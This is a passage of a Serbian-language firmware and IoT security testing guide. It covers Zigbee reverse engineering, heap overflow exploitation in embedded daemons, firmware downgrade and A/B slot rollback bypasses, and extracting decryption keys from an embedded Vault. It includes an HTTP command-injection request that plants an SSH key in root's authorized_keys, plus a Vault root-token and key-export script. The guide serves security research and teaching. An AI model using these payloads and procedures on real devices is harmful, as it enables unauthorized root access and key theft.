Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njihovom operativnom okruženju, uz upotrebu alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i prepoznavanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za ugrađene ciljne sisteme bez potpunog debugger-a, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa njim na daljinu:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / mapiranje poruka radio-koprocesora

Na IoT čvorištima RF stek je često podeljen između **radio MCU-a** i Linux procesa u korisničkom prostoru. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF okvir** u etru
2. **parser na strani kontrolera** na radio MCU-u
3. **serijski/UART tekstualni ili TLV protokol** prosleđen Linux-u (na primer `/dev/tty*`)
4. **dispečer aplikacije** u glavnom demonu
5. **rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura pruža dve mete za reverse engineering umesto jedne. Ako kontroler pretvara binarne radio okvire u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i tabele dispečera
- Koje poruke mogu doći sa **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji rukovaoci su dostupni samo tokom **commissioning** faze, otkrivanja ili preuzimanja firmvera/modela

Konkretno za Zigbee, snimite saobraćaj uparivanja i proverite da li se meta i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje saobraćaja tokom commissioning faze može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista zahteva.

### Rukovaoci protokola specifični za proizvođača i dostupnost kontrolisana FSM-om

Komande Zigbee/ZCL specifične za proizvođača često su bolja meta od standardizovanih klastera, jer vode do **prilagođenog koda za parsiranje** i internih **FSM-ova** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Obratnim inženjeringom analizirajte dispečer komandi dok ne pronađete **rukovalac dostupan samo za proizvođača**.
- Rekonstruišite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **prelazna stanja** koja automatski napreduju i grane za retry/error koje na kraju resetuju ili oslobađaju memoriju kojom upravlja napadač.
- Utvrdite koje su legitimne razmene protokola potrebne da se demon dovede u ranjivo stanje, umesto da pretpostavite da je ranjivi rukovalac uvek dostupan.

Kod protokola osetljivih na vreme, reprodukcija paketa pomoću Python okvira može biti prespora. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) pomoću steka namenjenog proizvođaču, kako bi se izložili odgovarajući **endpoints**, **attributes** i vremenski raspored commissioning postupka.

### Klasa grešaka u fragmentisanim preuzimanjima u ugrađenim demonima

Ponavljajuća klasa grešaka u firmveru javlja se pri **fragmentisanom preuzimanju blob/model/konfiguracionih podataka**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo **lokalna polja paketa** kojima upravlja napadač, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere da li je veličina manja od **prvobitno alocirane veličine**.

To omogućava napadaču da pošalje:

- Prvi validan fragment sa **malom** deklarisanom ukupnom veličinom kako bi izazvao malu alokaciju na hipu.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Krivotvorenu lokalnu veličinu paketa koja prolazi nove provere, a ipak prepisuje bafer čija je memorija prvobitno alocirana.

Kada se ranjiva putanja nalazi iza commissioning logike, eksploatacija mora da uključi dovoljno **emulacije uređaja** da bi se meta dovela do očekivanog stanja za preuzimanje modela ili blob-a pre slanja neispravnih fragmenata.

### Okidači `free()` zasnovani na protokolu

U ugrađenim demonima, najlakši način da se pokrene eksploatacija metapodataka hipa često nije „čekanje na čišćenje“, već **forsiranje sopstvene obrade grešaka protokola**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naknadne fragmente kako biste FSM prebacili u stanja **retry** ili **error**.
- Premašite prag pokušaja kako bi demon **resetovao kontekst** i oslobodio oštećeni bafer.
- Iskoristite ovaj predvidljivi `free()` da pokrenete primitive na strani alokatora pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv alokatora nalik na **musl/uClibc/dlmalloc** u ugrađenom Linux-u, gde korupcija metapodataka chunk-a može logiku unlink/unbin pretvoriti u primitivu za upis. Stabilan obrazac je da se ošteti **polje veličine** kako bi se obilazak alokatora preusmerio na **lažne chunk-ove postavljene unutar prepisanog bafera**, umesto da se odmah oštete stvarni pokazivači bin-ova i sruši proces.

## Eksploatacija binarnih programa i Proof-of-Concept

Izrada PoC-a za identifikovane ranjivosti zahteva temeljno razumevanje arhitekture mete i programiranje u jezicima nižeg nivoa. Zaštite tokom izvršavanja binarnih programa retke su u ugrađenim sistemima, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

### Napomene o eksploataciji uClibc fastbin-a (ugrađeni Linux)

- **Fastbins + konsolidacija:** uClibc koristi fastbins slične onima u glibc-u. Naknadna velika alokacija može pokrenuti `__malloc_consolidate()`, pa lažni chunk mora proći provere (razumna veličina, `fd = 0` i okolni chunk-ovi prepoznati kao „zauzeti“).<sup>[[6]](#references)</sup>
- **Binarni programi koji nisu PIE pod ASLR-om:** ako je ASLR omogućen, ali glavni binarni program **nije PIE**, adrese unutar binarnog programa u `.data/.bss` ostaju stabilne. Možete ciljati oblast koja već liči na validno zaglavlje heap chunk-a da biste fastbin alokaciju usmerili na **tabelu pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u payload-u može da zaustavi parsiranje, a da pritom zadrži prateće bajtove kojima upravlja napadač za stack pivot/ROP lanac.
- **Shellcode preko `/proc/self/mem`:** ROP lanac koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da smesti izvršivi shellcode u poznato mapiranje i pređe na njega.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju unapred konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena potrebnim alatima.

## Pripremljeni operativni sistemi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena proceni bezbednosti i penetration testing-u IoT uređaja. Štedi vam mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti ugrađenih sistema, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmvera.

## Napadi vraćanjem verzije firmvera na stariju i nesigurni mehanizmi ažuriranja

Čak i kada proizvođač implementira proveru kriptografskog potpisa slika firmvera, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Ako boot- ili recovery-loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se upisuje, napadač može legitimno da instalira **stariji, ranjivi firmver koji i dalje ima važeći potpis**, čime se ponovo uvode ranjivosti koje su bile otklonjene.<sup>[[4]](#references)</sup>

Tipičan postupak napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje, CDN-a ili stranice za podršku proizvođača.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Preuzmite je iz repozitorijuma trećih strana, kao što su VirusTotal, internet arhive, forumi itd.
2. **Otpremite sliku na uređaj ili je učinite dostupnom za preuzimanje** preko bilo kog izloženog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi IoT uređaji za potrošače izlažu HTTP(S) endpoint-e *bez autentifikacije*, koji prihvataju Base64-kodirane blob-ove firmvera, dekodiraju ih na strani servera i pokreću recovery/ažuriranje.
3. Nakon vraćanja na stariju verziju, iskoristite ranjivost koja je otklonjena u novijem izdanju (na primer filter za command injection dodat u kasnijem izdanju).
4. Po želji ponovo upišite najnoviju sliku ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja persistence-a.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom (vraćenom na stariju verziju) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde – omogućavanje root pristupa putem SSH ključa). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog nepostojanja zaštite od vraćanja na stariju verziju ta ispravka nema efekta.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne firmware slike u prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi-Fi veze. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez fizičkog pristupa hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje anti-rollback zaštite samo u updateru kod A/B dizajna slotova

Neki proizvođači zaista implementiraju **ratchet** protiv vraćanja na stariju verziju, ali samo u logici *updatera* (na primer, u UDS rutini preko CAN-a, komandi za oporavak ili OTA agentu u userspaceu). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slotova, zaštita od vraćanja na stariju verziju i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmvera sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater poredi ratchet slike sa vrednošću sačuvanom u trajnoj memoriji i odbacuje starije potpisane slike.
- Bootloader **ne** parsira taj ratchet i pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se odvojeno, u tabeli particija ili brojaču generacije za svaki slot, i **nije kriptografski vezana** za tačan digest firmvera koji je validiran.

To stvara primitivu **validiraj jednu sliku / pokreni drugu sliku** u sistemima sa dva slota. Ako napadač može da natera updater da označi slot B kao sledeći cilj pokretanja koristeći aktuelnu potpisanu sliku, a zatim da pre ponovnog pokretanja prepiše slot B, bootloader i dalje može da pokrene stariju sliku jer veruje samo metapodacima slota koji su već potvrđeni.

Uobičajen obrazac zloupotrebe:

1. Otpremite **aktuelan, potpisan** firmver u pasivni slot i pokrenite uobičajenu rutinu za validaciju/promenu, tako da raspored označi taj slot kao sledeći aktivni slot.
2. **Još nemojte ponovo pokretati uređaj**. U istoj sesiji ponovo pozovite rutinu za pripremu/brisanje slota.
3. Zloupotrebite zastarelo stanje pokretanja ili zastarelu logiku izbora slota kako bi updater obrisao **isti fizički slot** koji je upravo promovisan.
4. Zapišite u taj slot **stariji, ali i dalje potpisan** firmver.
5. Preskočite rutinu za validaciju koja sprovodi ratchet i direktno ponovo pokrenite uređaj.
6. Bootloader izabere promovisani slot, proveri samo potpis/integritet i pokrene staru sliku.

Na šta treba obratiti pažnju pri reverznom inženjeringu A/B mehanizama ažuriranja:

- Izbor slota izveden iz **zastavica pri pokretanju** koje se ne osvežavaju posle uspešne promene.
- Rutina nalik `prepare_passive_slot()`, koja briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog rasporeda**.
- Funkcija nalik `part_write_layout()`, koja samo uvećava **brojač generacije** / aktivnu zastavicu i ne čuva hash validirane slike.
- Provere ratcheta implementirane u userspaceu ili updateru, ali **ne** u ROM-u / bootloaderu / fazama secure boot-a.
- Rutine za brisanje ili oporavak koje ostavljaju slot označen kao pokretljiv čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/a autentifikacija *krajnje tačke za ažuriranje* adekvatno zaštićena (TLS + autentifikacija)?
* Da li uređaj upoređuje **brojeve verzija** ili **monotoni anti-rollback brojač** pre flešovanja?
* Da li se slika verifikuje unutar lanca secure boot-a (npr. da li ROM kod proverava potpise)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za digest/verziju validiranog firmvera**, ili je moguće izmeniti slot nakon promocije?
* Nakon uspešne promene slota, da li je uređaj primoran da se ponovo pokrene ili su kasnije rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li korisnički kod obavlja dodatne provere ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li *delimični* ili *rezervni* tokovi ažuriranja ponovo koriste istu logiku validacije?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjiv firmver za vežbu

Za vežbanje otkrivanja ranjivosti u firmveru, koristite sledeće ranjive projekte kao polaznu tačku.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmvera iz ugrađenog KMS/Vault stanja

Kada slika za ažuriranje kombinuje male metapodatke u otvorenom tekstu sa velikim blobom visoke entropije, najpre analizirajte kontejner, pre nego što pokušate bilo šta da razbijete grubom silom:<sup>[[1]](#references)</sup>

- Izdvojte zaglavlja, pomeraje i granice redova pomoću alata `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: narednih 8 bajtova čine salt, a preostali bajtovi su šifrat.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je nagoveštaj da je reč o RSA-2048 šifratu koji obavija nasumičnu lozinku sesije/firmvera.
- Izdvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostaviti da se njime obezbeđuje poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, obrnuto analizirajte **operativni put dešifrovanja** umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / binarnu datoteku za upravljanje i pratite ko čita šifrovani blob, koja pomoćna funkcija/API ga razmotava i koje logičko ime ključa traži.
- U izdvojenom root filesystemu potražite KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datoteke i init skripte.
- Tretirajte tekst u otvorenom obliku `vault operator unseal ...`, ključeve za oporavak, bootstrap tokene ili lokalne skripte za automatsko otpečaćivanje KMS-a kao ekvivalent materijala privatnog ključa.

Ako uređaj isporučuje originalnu Vault binarnu datoteku i pozadinsko skladište, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati interne funkcije Vault-a:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite ključ za unwrap: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ uz tačan par padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre pokušaja AES-CBC dekripcije.

Tako „šifrovani firmware” postaje opštiji problem: **oporavite operativne ključeve na strani uređaja, a zatim van mreže reprodukujte tačne parametre unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Krekovanje firmware-a uz Claude: veštine višeg nivoa, autonomija početnika](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktično hakovanje IoT-a: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 $ omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sad me vidiš: sad si hakovan](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko konektora za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: iskorišćavanje Philips Hue Bridge-a putem bežičnog ažuriranja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 1. deo: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i ispravljanje](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS lozinke: slaba XOR enkripcija omogućava oporavak iz SPI Flash-a (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Alat za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
